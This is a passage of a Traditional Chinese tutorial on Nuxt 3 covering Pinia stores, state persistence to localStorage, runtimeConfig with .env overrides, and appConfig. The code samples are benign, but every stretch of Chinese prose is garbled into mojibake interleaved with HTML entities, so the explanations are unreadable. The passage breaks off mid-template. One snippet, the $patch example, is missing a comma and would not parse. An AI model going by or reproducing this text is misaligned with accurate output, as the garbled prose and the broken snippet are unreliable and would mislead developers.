ä¾†æ”¹è®Šç‹€æ…‹ã€‚\nåœ¨ä¸åŒçš„å…ƒä»¶é–“ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ useCounterStore å–å¾—å·²ç¶“å»ºç«‹å¥½çš„ store ä¾†å…±äº«é€™äº›ç‹€æ…‹æˆ–é€²è¡Œæ“ä½œã€‚\nPinia Store çš„ State é è¨­æƒ…æ³ä¸‹ï¼Œå¯ä»¥ç›´æ¥å° store çš„å¯¦ä¾‹ä¾†å–å¾—ç‹€æ…‹ï¼Œè€Œä½¿ç”¨ Pinia å®šç¾©çš„ store æ¯”è¼ƒç‰¹åˆ¥çš„æ˜¯ï¼Œæˆ‘å€‘å¯ä»¥ä¸ç”¨é€éå‘¼å«å‡½æ•¸ä¾†ä¿®æ”¹ç‹€æ…‹ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å° store çš„ç‹€æ…‹é€²è¡Œä¿®æ”¹ã€‚\n1 2 3 const counterStore = useCounterStore() counterStore.count += 10 æ”¹è®Šç‹€æ…‹ é™¤äº†ç›´æ¥ä½¿ç”¨ counterStore.count += 10 ä¿®æ”¹ storeï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ store æä¾›çš„ helper $patch ä¾†ä¿®æ”¹éƒ¨åˆ†çš„ç‹€æ…‹ã€‚\n1 2 3 4 userStore.$patch({ name: \u0026#39;Ryan\u0026#39; money: \u0026#39;88888888\u0026#39;, }) å°æ–¼é›†åˆé¡å‹çš„ä¿®æ”¹ï¼Œä¾‹å¦‚é™£åˆ—çš„æ–°å¢ã€åˆªé™¤æˆ–æŒ‡å®šä¿®æ”¹æŸä¸€å€‹å…ƒç´ ç­‰æ“ä½œï¼Œä½ å¯ä»¥ä½¿ç”¨ $patch å‚³å…¥ä¸€å€‹å‡½æ•¸ï¼Œé€™å€‹å‡½æ•¸æœƒæ¥æ”¶ä¸€å€‹ state è®“ä½ å¯ä»¥ä¿®æ”¹ï¼Œå°æ–¼æ¯”è¼ƒè¤‡é›œçš„æ“ä½œæœƒå¾ˆæ–¹ä¾¿ã€‚\n1 2 3 4 cartStore.$patch((state) =\u0026gt; { state.items.push({ name: \u0026#39;shoes\u0026#39;, quantity: 1 }) state.hasChanged = true }) å¦‚æœä½ éœ€è¦ï¼Œä¹Ÿå¯ä»¥å°‡ store çš„æ•´å€‹ state é‡æ–°è¨­ç½®æˆä¸€å€‹æ–°çš„ç‰©ä»¶ã€‚\n1 2 3 4 cartStore.$state = { items: [], hasChanged: false, } é‡ç½®ç‹€æ…‹ store çš„å¯¦ä¾‹æä¾›äº†ä¸€å€‹ $reset() çš„ helperï¼Œå‘¼å«å®ƒå°±å¯ä»¥å°‡ store çš„ç‹€æ…‹é‡ç½®è‡³åˆå§‹å€¼ï¼Œä¸éç›®å‰åªåœ¨ä½¿ç”¨ Option ç‰©ä»¶å®šç¾©çš„ store æ‰æœ‰å¯¦ä½œã€‚\n1 2 3 const counterStore = useCounterStore() counterStore.$reset() Pinia Store çš„ Getters ä½¿ç”¨åŒä¸€å€‹ store ä¸­çš„å…¶ä»– getter åœ¨ store å…§ä½ å¯ä»¥çµ„åˆå¤šå€‹ getterï¼Œåœ¨ Option ç‰©ä»¶ä¸‹ï¼Œå¯ä»¥é€éä½¿ç”¨ this ä¾†å‘¼å«ä½¿ç”¨å…¶ä»–çš„ getterã€‚\n1 2 3 4 5 6 7 8 9 10 11 export const useStore = defineStore(\u0026#39;main\u0026#39;, { state: () =\u0026gt; ({ counter: 0, }), getters: { doubleCount: (state) =\u0026gt; state.counter * 2, doubleCountPlusOne() { return this.doubleCount + 1 }, } }) ä½¿ç”¨å…¶ä»– store çš„ getter åœ¨ store å…§ä½ ä¹Ÿå¯ä»¥çµ„åˆå…¶ä»– store çš„ getterï¼Œåªè¦å»ºç«‹å‡ºå…¶ä»– store å¯¦ä¾‹å°±å¯ä»¥å‘¼å«ä½¿ç”¨äº†ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 import { useOtherStore } from \u0026#39;./other-store\u0026#39; export const useStore = defineStore(\u0026#39;main\u0026#39;, { state: () =\u0026gt; ({ // ... }), getters: { otherGetter(state) { const otherStore = useOtherStore() return state.localData + otherStore.data }, }, }) Pinia Store çš„ Actions Actions ç›¸ç•¶æ–¼å…ƒä»¶ä¸­çš„æ–¹æ³•ï¼Œä¹Ÿæ˜¯ä¿®æ”¹ç‹€æ…‹çš„å•†æ¥­é‚è¼¯å®šç¾©çš„ä½ç½®ï¼Œaction å¯ä»¥æ˜¯åŒæ­¥ä¹Ÿå¯ä»¥æ˜¯ç•°æ­¥çš„ï¼Œå› æ­¤ï¼Œæˆ‘å€‘ä¹Ÿèƒ½åœ¨ action ä¸­æ‰“å¾Œç«¯ API ä¾†å–å¾—è³‡æ–™å¾Œæ›´æ–°ç‹€æ…‹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import { defineStore } from \u0026#39;pinia\u0026#39; export const useUserStore = defineStore(\u0026#39;user\u0026#39;, { state: () =\u0026gt; ({ profile: { name: \u0026#39;\u0026#39;, gender: \u0026#39;\u0026#39;, email: \u0026#39;\u0026#39; } }), actions: { async getUserProfile() { try { const { data } = await useFetch(\u0026#39;/api/profile\u0026#39;) this.profile = data } catch (error) { return error } } } }) Store çš„è§£æ§‹ æœ‰äº›æƒ…æ³ï¼Œä½ å¯èƒ½éœ€è¦å°‡ Store ä¸­çš„å±¬æ€§æˆ–æ–¹æ³•ç¨ç«‹çš„æå–å‡ºä¾†ï¼Œä½†ç‚ºäº†ä¿æŒå±¬æ€§çš„éŸ¿æ‡‰æ€§ï¼Œä½ éœ€è¦ä½¿ç”¨ storeToRefs ä¾†å»ºç«‹å±¬æ€§çš„åƒè€ƒï¼Œå°±åƒä½¿ç”¨ toRefs ä¾†å»ºç«‹ props çš„åƒè€ƒä¸€æ¨£ã€‚\n1 2 3 4 5 6 7 import { storeToRefs } from \u0026#39;pinia\u0026#39; import { useCounterStore } from \u0026#39;@/stores/counter\u0026#39; const counterStore = useCounterStore() const { count } = storeToRefs(counterStore) const { increment, decrement } = counterStore Pinia æŒä¹…åŒ–æ’ä»¶ - Pinia Plugin Persistedstate Pinia æ˜¯å€‹éå¸¸è¼•é‡çš„ç‹€æ…‹ç®¡ç†è§£æ±ºæ–¹æ¡ˆï¼Œè€Œä¸”ä¹Ÿæä¾›åº•å±¤ API ä½¿å¾— Pinia èƒ½å¤ è‡ªå®šç¾©æ’ä»¶ä¾†æ“´å±•åŠŸèƒ½ï¼Œèˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘å€‘æœ‰äº›ç‹€æ…‹éœ€è¦å„²å­˜åœ¨ä½¿ç”¨è€…ç€è¦½å™¨ä¸­ï¼Œä¸‹æ¬¡å†ç€è¦½æ™‚å¯ä»¥å–çš„ç•¶æ™‚å„²å­˜çš„ç‹€æ…‹è³‡æ–™ï¼Œæˆ‘å€‘å°±éœ€è¦å°‡ store çš„ç‹€æ…‹æŒä¹…åŒ–ã€‚\næˆ‘å€‘å¯ä»¥ä½¿ç”¨ Pinia Plugin Persistedstate é€™å€‹æ’ä»¶ï¼Œä¾†åšåˆ°æŒä¹…åŒ–é€™ä»¶äº‹ï¼Œé€™å°æ–¼å„²å­˜ä½¿ç”¨è€…è³‡è¨Šæˆ–ç™»å…¥ç‹€æ…‹éå¸¸çš„æ–¹ä¾¿ã€‚\nåœ¨ Nuxt 3 ä¸­é…ç½®ä½¿ç”¨ Pinia Plugin Persistedstate Step 1. å®‰è£å¥—ä»¶ 1 2 3 npm install -D pinia-plugin-persistedstate --force # or # yarn add -D pinia-plugin-persistedstate --force ç›®å‰ç…§è‘—å®˜æ–¹å®‰è£ Piniaï¼Œæœƒç™¼ç”Ÿä¸€äº›å•é¡Œï¼Œæ‰€ä»¥æˆ‘å€‘åœ¨å®‰è£æ™‚åŠ ä¸Š \u0026ndash;force åƒæ•¸\nStep 2. åœ¨ Nuxt 3 ç‚º Pinia æ·»åŠ  Persist æ’ä»¶ å»ºç«‹ ./plugins/pinia-plugin-persistedstate.client.jsï¼Œå…§å®¹å¦‚ä¸‹ï¼š\nplugins/pinia-plugin-persistedstate.client.js 1 2 3 4 5 import piniaPersistedstate from \u0026#39;pinia-plugin-persistedstate\u0026#39; export default defineNuxtPlugin((nuxtApp) =\u0026gt; { nuxtApp.$pinia.use(piniaPersistedstate) }) Step 3. ç‚ºä½ çš„ Store æ·»åŠ æŒä¹…åŒ–é…ç½® åœ¨ç¾æœ‰çš„ store å®šç¾©ä¸­æ·»åŠ ï¼Œpersist å±¬æ€§ï¼Œä¾†é…ç½® store æŒä¹…åŒ–ï¼Œå°‡ç‹€æ…‹å„²å­˜åœ¨ç€è¦½å™¨çš„ localStorageã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import { defineStore } from \u0026#39;pinia\u0026#39; export const useCounterStore = defineStore(\u0026#39;counter\u0026#39;, { state: () =\u0026gt; ({ count: 0 }), actions: { increment() { this.count += 1 }, decrement() { this.count -= 1 } }, getters: { doubleCount: (state) =\u0026gt; state.count * 2 }, persist: { enabled: true, strategies: [ { key: \u0026#39;counter\u0026#39;, storage: process.client ? localStorage : null } ] } }) å¦‚æœæ˜¯ä½¿ç”¨ setup å‡½æ•¸å®šç¾© storeï¼Œä½ å¯ä»¥åœ¨ defineStore å‚³å…¥ç¬¬ä¸‰å€‹åƒæ•¸ä¸¦æ·»åŠ  persist å±¬æ€§ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 import { defineStore } from \u0026#39;pinia\u0026#39; export const useCounterStore = defineStore( \u0026#39;counter\u0026#39;, () =\u0026gt; { const count = useState(\u0026#39;count\u0026#39;, () =\u0026gt; 0) const increment = () =\u0026gt; { count.value += 1 } const decrement = () =\u0026gt; { count.value -= 1 } const doubleCount = computed(() =\u0026gt; count.value * 2) return { count, increment, decrement, doubleCount } }, { persist: { enabled: true, strategies: [ { key: \u0026#39;counter\u0026#39;, storage: process.client ? localStorage : null } ] } } ) Step 4. æŒä¹…åŒ–æ•ˆæœ ç•¶æˆ‘å€‘è¨­ç½®å¥½ counterStore çš„æŒä¹…åŒ–å¾Œï¼Œæˆ‘å€‘çš„ç‹€æ…‹å°±æœƒè¢«å„²å­˜åœ¨ç€è¦½å™¨çš„ localStorage ä¹‹ä¸­ï¼Œå°±ç®—é—œé–‰ç€è¦½å™¨æˆ–é‡æ–°æ•´ç†ç¶²é ï¼Œstore çš„ç‹€æ…‹éƒ½æœƒå†å¾ localStorage è®€å–å‡ºä¾†ã€‚\nåœ¨å°å‹çš„å°ˆæ¡ˆä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ useState ä¾†ç®¡ç†ï¼Œä½†å¤§å°ˆæ¡ˆä½ å°±éœ€è¦ä¸€å€‹æ›´å¥½çš„æ–¹å¼ä¾†ç®¡ç†é€™äº›ç‹€æ…‹ï¼Œå¦‚ Pinia ä¾†ç‚ºæˆ‘å€‘ç®¡ç†é€™äº›ç‹€æ…‹ï¼Œç”šè‡³å®šç¾©å¤šå€‹ storeï¼ŒPinia æ”¯æ´çš„æ’ä»¶èƒ½å”åŠ©æˆ‘å€‘æ“´å±• Pinia çš„åŠŸèƒ½ï¼ŒPinia Plugin Persistedstate å°±æ˜¯ä¸€å€‹å¾ˆå¸¸ç”¨çš„æ’ä»¶ï¼Œèƒ½å”åŠ©æˆ‘å€‘å°‡ Pinia çš„ç‹€æ…‹æŒä¹…åŒ–è‡³ç€è¦½å™¨çš„ localStorage æˆ– sessionStorage ä¸­ã€‚\nRuntime Config \u0026amp; App Config åœ¨ Nuxt 3 ä¸­æä¾›äº†å…©ç¨®å¯ä»¥æ–¹å¼è¨­å®šç’°å¢ƒè®Šæ•¸æˆ–å‰ç«¯éœ€è¦ä½¿ç”¨çš„å…±ç”¨è¨­å®šï¼Œåˆ†åˆ¥æ˜¯åœ¨ Nuxt å•Ÿå‹•æ™‚æœƒåœ¨å¾Œç«¯è¼‰å…¥ä½¿ç”¨çš„ Runtime Config åŠå¯ä»¥åœ¨å‰ç«¯è¢«ä½¿ç”¨çš„ App Config é€™å…©è€…é–“çš„å€åˆ¥é€™é‚Šåšä¸€äº›è¬›è§£ã€‚\nRuntime Config åœ¨é–‹ç™¼ç¶²ç«™æˆ–éƒ¨ç½²æ™‚ï¼Œæˆ‘å€‘ç¸½æ˜¯æœ‰ä¸€äº›ç’°å¢ƒè®Šæ•¸éœ€è¦åšè¨­ç½®ï¼Œdotenv å°±æ˜¯ä¸€å€‹å¾ˆå¥½ç”¨çš„å¥—ä»¶ï¼Œèƒ½å¹«åŠ©æˆ‘å€‘å°‡å°ˆæ¡ˆä¸‹çš„ .env æª”æ¡ˆè¼‰å…¥åˆ° Node.js çš„ process.env ä¹‹ä¸­ï¼Œå°¤å…¶åœ¨å¾Œç«¯ä¼ºæœå™¨çš„ API é–‹ç™¼ï¼Œé€™äº›ä¸èƒ½å…¬é–‹æˆ–æ•æ„Ÿçš„ Key æˆ–è¨­å®šå€¼ï¼Œé€šå¸¸ä¸æœƒèˆ‡æ•´å€‹å°ˆæ¡ˆä¸€èµ·é€²è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œè€Œæ˜¯é‡å°ä¸åŒç’°å¢ƒèˆ‡æ©Ÿå™¨ï¼Œé…ç½®æ–¼ .env æˆ–ç’°å¢ƒè®Šæ•¸ä¹‹ä¸­ã€‚\né€™å€‹ .env è¨­å®šæª”å…§çš„ç’°å¢ƒè®Šæ•¸ï¼Œä¾‹å¦‚ï¼šè³‡æ–™åº«çš„å¸³è™Ÿå¯†ç¢¼ã€ç¬¬ä¸‰æ–¹æœå‹™çš„ Token æˆ– API Key \u0026hellip;ç­‰ï¼Œé€šå¸¸åªæœƒåœ¨ä¼ºæœå™¨è¢«è®€å–åšä½¿ç”¨ï¼Œä¹Ÿä¸æœƒæ´©æ¼é€™äº›è¨­å®šçµ¦ä½¿ç”¨è€…çŸ¥é“ï¼Œæˆ‘å€‘ä¹Ÿç¨±ä¹‹ç‚ºåŸ·è¡Œæ™‚çš„è¨­å®š (Runtime Config)ã€‚\nNuxt 3 æä¾›äº†å¯ä»¥è¨­å®š Runtime Config çš„æ–¹å¼ï¼Œæˆ‘å€‘å¯ä»¥å¾ˆæ–¹ä¾¿çš„ä¾†è¨­å®šé€™äº›ç’°å¢ƒè®Šæ•¸çµ¦äºˆä¼ºæœå™¨åŸ·è¡Œæ™‚ä½¿ç”¨ã€‚\né…ç½® runtimeConfig æˆ‘å€‘å¯ä»¥åœ¨ nuxt.config.ts ä¸­æ·»åŠ  runtimeConfig å±¬æ€§ï¼Œå°±å¯ä»¥ä¾†è¨­å®šåªæœ‰ä¼ºæœå™¨ç«¯å¯ä»¥ä½¿ç”¨çš„ç’°å¢ƒè®Šæ•¸ã€‚\nä¾‹å¦‚ï¼Œåœ¨ nuxt.config.ts æª”æ¡ˆä¸­ï¼Œæ·»åŠ ä¸€å€‹ apiSecret è‡³ runtimeConfig å±¬æ€§å…§ï¼š\nnuxt.config.ts 1 2 3 4 5 export default defineNuxtConfig({ runtimeConfig: { apiSecret: \u0026#39;æ€éº¼å¯ä»¥è®“ä½ çŸ¥é“å‘¢ :P\u0026#39; } }) æˆ‘å€‘å°±å¯ä»¥åœ¨ Server API ä½¿ç”¨ useRuntimeConfig() ç²å¾—åŸ·è¡Œæ™‚çš„è¨­å®šï¼Œå†å¾ä¸­å–å¾— apiSecret ç’°å¢ƒè®Šæ•¸ã€‚\n1 2 3 4 5 6 7 8 9 10 const runtimeConfig = useRuntimeConfig() export default defineEventHandler((event) =\u0026gt; { const { apiSecret } = runtimeConfig console.log(`æ¥æ”¶åˆ°äº†ä¸€å€‹ Server API è«‹æ±‚: ${event.req.url}`) console.log(`åŸ·è¡Œæ™‚çš„ç’°å¢ƒè®Šæ•¸ [apiSecret]: ${apiSecret}`) return \u0026#39;ok\u0026#39; }) å› ç‚ºæˆ‘å€‘æ˜¯å®šç¾©åœ¨ Server APIï¼Œæ‰€ä»¥å¯ä»¥åœ¨æ¸¬è©¦ä¼ºæœå™¨å•Ÿå‹•çš„ Terminal çœ‹è¦‹ console.log çš„çµæœã€‚\næ­¤å¤–ä½ ä¹Ÿå¯ä»¥åœ¨æ’ä»¶æˆ– Vue ä¸­ä½¿ç”¨ useRuntimeConfig() ä¾†å–å¾—åŸ·è¡Œæ™‚çš„è¨­ç½®ï¼Œä½†ä¹Ÿåƒ…åœ¨ setup æˆ– Nuxt Lifecycle Hooks ä¸­æœ‰æ•ˆã€‚\nå®¢æˆ¶ç«¯ä½¿ç”¨ runtimeConfig é€šå¸¸ä¸€äº›å¯†é‘°æˆ–æ•æ„Ÿè³‡è¨Šï¼Œæˆ‘å€‘éƒ½æœƒå®šç¾©åœ¨ runtimeConfig åƒ…ä¾›ä¼ºæœå™¨ç«¯åšä½¿ç”¨ï¼Œè€Œ runtimeConfig ä¹Ÿå¯ä»¥é…ç½®ä¸€å€‹ public çš„å±¬æ€§ï¼Œä¾†æŠŠä¸€äº›ç’°å¢ƒè®Šæ•¸æ–¼ä¼ºæœå™¨ç«¯æˆ–å®¢æˆ¶ç«¯åšä½¿ç”¨ï¼Œä¾‹å¦‚ï¼ŒAPI çš„ Base URL é€™é¡åœ¨ä¼ºæœå™¨ç«¯æ‰“ API æ™‚æœƒéœ€è¦ä½¿ç”¨ï¼Œè€Œå®¢æˆ¶ç«¯çš„æ“ä½œæµç¨‹ä¹Ÿæœƒæ‰“åŒæ¨£çš„ API ä½ç½®ï¼Œæˆ‘å€‘å°±å¯ä»¥ä½¿ç”¨ public çš„å±¬æ€§ã€‚\nä¾‹å¦‚ï¼Œåœ¨ nuxt.config.ts æª”æ¡ˆä¸­ï¼Œæ·»åŠ ä¸€å€‹ apiBase è‡³ runtimeConfig.public å±¬æ€§å…§ï¼š\nnuxt.config.ts 1 2 3 4 5 6 7 8 export default defineNuxtConfig({ runtimeConfig: { apiSecret: \u0026#39;æ€éº¼å¯ä»¥è®“ä½ çŸ¥é“å‘¢ :P\u0026#39;, public: { apiBase: \u0026#39;/api\u0026#39; } } }) æ–°å¢ ./pages/profile.vue é é¢ï¼š\npages/profile.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;my-24 flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;mt-4 text-2xl text-gray-600\u0026#34;\u0026gt;å›å‚³è³‡æ–™:\u0026lt;/span\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-3xl font-semibold text-blue-500\u0026#34;\u0026gt;{{ data }}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const runtimeConfig = useRuntimeConfig() const { apiBase } = runtimeConfig.public console.log(toRaw(runtimeConfig)) const { data } = await useFetch(`${apiBase}/hello`) \u0026lt;/script\u0026gt; æ·»åŠ åœ¨ runtimeConfig.public å±¬æ€§çš„ç’°å¢ƒè®Šæ•¸ï¼Œåœ¨ä¼ºæœå™¨ç«¯èˆ‡å®¢æˆ¶ç«¯éƒ½å¯ä»¥è®€å–å¾—åˆ°ã€‚\nä¸‹åœ–ä¸­å¯ä»¥ç™¼ç¾ï¼Œåœ¨ç€è¦½å™¨ä¸­çš„ Console æ‰€å°å‡ºçš„ runtimeConfig æ˜¯ä¸æœƒåŒ…å«åƒ…æœ‰åœ¨ä¼ºæœå™¨ç«¯èƒ½ä½¿ç”¨çš„ apiSecretã€‚\nä½¿ç”¨ .env å»ºç«‹ç’°å¢ƒè®Šæ•¸ Nuxt åœ¨é–‹ç™¼æ¨¡å¼æˆ–åŸ·è¡Œæ™‚ï¼Œå·²ç¶“æœ‰å…§å»º dotenvï¼Œå¦‚æœåœ¨å°ˆæ¡ˆç›®éŒ„ä¸‹æ·»åŠ äº† .envï¼ŒNuxt æœƒåœ¨é–‹ç™¼æœŸé–“ã€å»ºæ§‹æ™‚æˆ–ç”¢ç”Ÿéœæ…‹ç¶²ç«™æ™‚ï¼Œè‡ªå‹•è¼‰å…¥ .env å…§çš„ç’°å¢ƒè®Šæ•¸ã€‚\nä¾‹å¦‚å»ºç«‹ .env æª”æ¡ˆï¼Œå…§å®¹å¦‚ä¸‹ï¼š\n.env 1 2 NUXT_API_SECRET=api_secret_token NUXT_PUBLIC_API_BASE=https://nuxtjs.org é€™å…©å€‹å€¼ï¼Œå°‡è¢« dotenv è‡ªå‹•è¼‰å…¥è‡³ process.env ä¸­ï¼Œä½œç‚ºç’°å¢ƒè®Šæ•¸ã€‚\nç’°å¢ƒè®Šæ•¸çš„è¦†è“‹ ä¸è«–æ˜¯é€é dotenv è‡ªå‹•è¼‰å…¥ .env æˆ–å…¶ä»–æ–¹å¼é…ç½®çš„ç’°å¢ƒè®Šæ•¸ï¼Œåªè¦ç’°å¢ƒè®Šæ•¸å‘½åæ˜¯ NUXT_ é–‹é ­ï¼Œé€™å€‹ç’°å¢ƒè®Šæ•¸å°‡æœƒè¦†è“‹ runtimeConfig çš„è¨­ç½®ã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œç•¶æˆ‘å€‘ runtimeConfig è¨­ç½®å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 export default defineNuxtConfig({ runtimeConfig: { apiSecret: \u0026#39;æ€éº¼å¯ä»¥è®“ä½ çŸ¥é“å‘¢ :P\u0026#39;, public: { apiBase: \u0026#39;/api\u0026#39; } } }) å»ºç«‹ .env æª”æ¡ˆæˆ–å…¶ä»–æ–¹å¼è¨­ç½®ä¸‹åˆ—ç’°å¢ƒè®Šæ•¸ï¼š\n1 2 NUXT_API_SECRET=api_secret_token NUXT_PUBLIC_API_BASE=https://nuxtjs.org é‚£éº¼ NUXT_API_SECRET ç’°å¢ƒè®Šæ•¸ï¼Œå°‡æœƒè¦†è“‹ runtimeConfig.apiSecretï¼Œè€Œ NUXT_PUBLIC_API_BASE å°‡æœƒè¦†è“‹ runtimeConfig.public.apiBaseï¼Œæœ€çµ‚ runtimeConfig çš„è¨­å®šæœƒè®Šæˆå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 { apiSecret: \u0026#34;api_secret_token\u0026#34;, // è¢« NUXT_API_SECRET ç’°å¢ƒè®Šæ•¸è¦†è“‹ public: { apiBase: \u0026#34;https://nuxtjs.org\u0026#34; // è¢« NUXT_PUBLIC_API_BASE ç’°å¢ƒè®Šæ•¸è¦†è“‹ } } æœƒæœ‰é€™æ¨£å­çš„ç‰¹æ€§æ˜¯å› ç‚º Nuxt æœƒåœ¨å•Ÿå‹•æ™‚ï¼Œå…ˆè¼‰å…¥ nuxt.conf.ts å…§çš„ runtimeConfigï¼Œå»ºç«‹å‡ºå‘¼å« useRuntimeConfig() æ‰€å¾—åˆ°çš„åŸ·è¡Œæ™‚è¨­å®šï¼Œä¾‹å¦‚ï¼Œå…ˆå»ºæ§‹å‡ºäº† _runtimeConfig ç‰©ä»¶ã€‚\n1 2 3 4 5 6 const _runtimeConfig = { apiSecret: \u0026#39;æ€éº¼å¯ä»¥è®“ä½ çŸ¥é“å‘¢ :P\u0026#39;, public: { apiBase: \u0026#39;/api\u0026#39; } } æ¥è‘—æœƒèµ°è¨ªé€™å€‹ _runtimeConfig ç‰©ä»¶è£¡é¢çš„ keyï¼Œé€ä¸€å°‡ key çš„åç¨±è½‰æ›è›‡å½¢å‘½åæ³• (Snake case)ï¼Œä¸¦è½‰æˆå…¨å¤§å¯«å†åŠ ä¸Š NUXT_ å‰ç¶´å¾Œå–å¾—å°æ‡‰çš„ç’°å¢ƒè®Šæ•¸ï¼Œå¦‚æœå­˜åœ¨å°±æœƒä»¥æ–°å€¼ä¾†è¦†è“‹ _runtimeConfig å…§çš„å±¬æ€§ã€‚\nä¾‹å¦‚ apiSecret ç¶“éè½‰æ›è®Šæˆ api_secretï¼Œæ¥è‘—è½‰å¤§å¯« API_SECRET æœ€å¾ŒåŠ ä¸Šå‰ç¶´è®Šæˆ NUXT_API_SECRETï¼Œå¦‚æ­¤ç’°å¢ƒè®Šæ•¸ NUXT_API_SECRET çš„å€¼å°±è¦†è“‹ runtimeConfig.apiSecretã€‚\nè€Œåœ¨ public ä¸‹çš„è¨­ç½®ï¼Œä¹Ÿæœƒå…ˆè½‰ç‚º public_apiBase å†ç¶“éè›‡è¡Œå‘½åæˆ public_api_base ç­‰æ­¥é©Ÿï¼Œæœ€å¾Œè®Šæˆ NUXT_PUBLIC_API_BASE ä¾†è¼‰å…¥ç’°å¢ƒè®Šæ•¸ä¸¦è¦†è“‹ã€‚\næœ€å¾Œå°æé†’ï¼Œç•¶å»ºæ§‹å‡ºç”Ÿç”¢ç’°å¢ƒçš„ç¶²ç«™ï¼Œå¦‚ .output ç›®éŒ„å¾Œï¼Œdotenv ä¸¦ä¸æœƒåŒ…å«åœ¨å»ºæ§‹çš„ç¶²ç«™å…§ï¼Œ ä½ éœ€è¦å†è‡ªå·±è¼‰å…¥æˆ–é…ç½®ç’°å¢ƒè®Šæ•¸æ‰èƒ½æ­£å¸¸é‹ä½œå“¦ï¼Œä¾‹å¦‚åœ¨ PM2 é…ç½® envã€‚\nApp Config é…ç½® appConfig åœ¨ nuxt.config.ts æª”æ¡ˆä¸­ï¼Œå¯ä»¥åœ¨ appConfig å±¬æ€§å…§æ·»åŠ è¨­ç½®ï¼Œä¾‹å¦‚ï¼Œé€šå¸¸æˆ‘å€‘æœƒæ·»åŠ åƒç¶²ç«™ä¸»é¡Œçš„ä¸»è‰²ç­‰é€™é¡å¯ä»¥å…¬é–‹çš„é…ç½®ï¼Œè®“ç¶²ç«™å¯ä»¥ä½¿ç”¨é€™å€‹è¨­ç½®ã€‚\n1 2 3 4 5 6 7 export default defineNuxtConfig({ appConfig: { theme: { primaryColor: \u0026#39;#0ea5e9\u0026#39; } } }) ç•¶å»ºç«‹å¥½ appConfig å¾Œï¼Œå°±å¯ä»¥ä½¿ç”¨çµ„åˆå¼å‡½æ•¸ useAppConfig() ä¾†å–å¾—è¨­ç½®ã€‚\nä¾‹å¦‚ï¼Œå»ºç«‹ ./pages/config.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\npages/config.vue 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;my-24 flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;mt-4 text-2xl text-gray-600\u0026#34;\u0026gt;theme.primaryColor:\u0026lt;/span\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-3xl font-semibold text-blue-500\u0026#34;\u0026gt;{{ theme.primaryColor }}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const appConfig = useAppConfig() const { theme } = appConfig \u0026lt;/script\u0026gt; app.config æª”æ¡ˆ ä½ ä¹Ÿå¯ä»¥åœ¨å°ˆæ¡ˆç›®éŒ„ä¸‹å»ºç«‹ app.config.ts ä¾†é…ç½® App Configï¼Œé€™å€‹æª”æ¡ˆçš„å‰¯æª”åå¯ä»¥æ˜¯ .tsã€.js æˆ– .mjsã€‚\napp.config.ts 1 2 3 4 5 export default defineAppConfig({ theme: { primaryColor: \u0026#39;#3b82f6\u0026#39; } }) ç•¶å»ºç«‹äº† app.config.ts æª”æ¡ˆï¼Œè©²è¨­å®šæœƒèˆ‡ nuxt.config.ts æª”æ¡ˆä¸­çš„ appConfig å±¬æ€§çµåˆï¼Œå¦‚æœå…·æœ‰ç›¸åŒçš„å‘½åï¼Œå‰‡ä»¥ app.config.ts æª”æ¡ˆå…§çš„è¨­ç½®ç‚ºä¸»ã€‚\nå…·æœ‰éŸ¿æ‡‰å¼çš„è¨­å®š ç•¶è¨­å®šå¥½çš„ App Config åœ¨ä½¿ç”¨æ™‚ï¼Œè§£æ§‹å‡ºçš„è®Šæ•¸æ˜¯å…·æœ‰éŸ¿æ‡‰æ€§çš„ï¼Œä¹Ÿå°±æ˜¯èªªåœ¨å…¶ä»–é é¢ä¿®æ”¹ä¸»é¡Œé¡è‰²çš„è¨­å®šï¼Œå¯ä»¥éŸ¿æ‡‰è‡³æ‰€æœ‰ä½¿ç”¨é€™å€‹è¨­å®šçš„å…ƒä»¶ã€‚\nèˆ‰å€‹ä¾‹å­ï¼Œæ–°å¢ä¸€å€‹ darkMode çš„å±¬æ€§è‡³ app.config.ts æª”æ¡ˆå…§çš„ themeï¼š\napp.config.ts 1 2 3 4 5 6 export default defineAppConfig({ theme: { primaryColor: \u0026#39;#3b82f6\u0026#39;, darkMode: false } }) å»ºç«‹ ./pages/index.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\npages/index.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-gray-800\u0026#34;\u0026gt;é€™è£¡æ˜¯é¦–é \u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;my-4 flex flex-col space-y-4\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/config\u0026#34;\u0026gt;å‰å¾€ /config\u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-2xl 